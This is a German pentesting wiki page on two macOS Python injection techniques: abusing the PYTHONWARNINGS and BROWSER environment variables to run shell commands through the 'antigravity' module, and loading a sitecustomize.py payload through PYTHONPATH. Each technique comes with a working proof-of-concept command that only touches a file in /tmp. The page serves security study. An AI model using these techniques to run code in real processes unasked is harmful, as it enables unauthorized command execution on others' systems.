# Python-Anwendungsinjektion unter macOS

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariablen `PYTHONWARNINGS` und `BROWSER`

Wenn ein Angreifer die Umgebung eines Python-Prozesses kontrollieren kann, kann die Kombination aus `PYTHONWARNINGS` und `BROWSER` die Befehlsausführung auslösen, wenn Python beim Verarbeiten einer manipulierten Warnoption das Modul `antigravity` importiert. Die Technik basiert darauf, dass `antigravity` mit Pythons Modul `webbrowser` eine URL öffnet, wobei die Umgebungsvariable `BROWSER` berücksichtigt wird.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Über `PYTHONPATH` und `sitecustomize.py`

Beim normalen Start fügt Pythons `site`-Modul systemspezifische Pfade hinzu und versucht anschließend, ein Modul namens `sitecustomize` zu importieren. Indem ein für den Angreifer lesbares Verzeichnis an die erste Stelle von `PYTHONPATH` gesetzt wird, kann ein Angreifer, der die Prozessumgebung kontrolliert, Python dazu bringen, eine Payload vor dem Zielskript zu importieren. Das Flag `-S` deaktiviert die automatische Initialisierung von `site`, während der isolierte Modus (`-I`) `PYTHONPATH` ignoriert und `-s` sowie `-E` impliziert.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking mit Umgebungsvariablen - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Website-spezifischer Konfigurations-Hook](https://docs.python.org/3/library/site.html)
- [3] [Python-Kommandozeile und -Umgebung](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
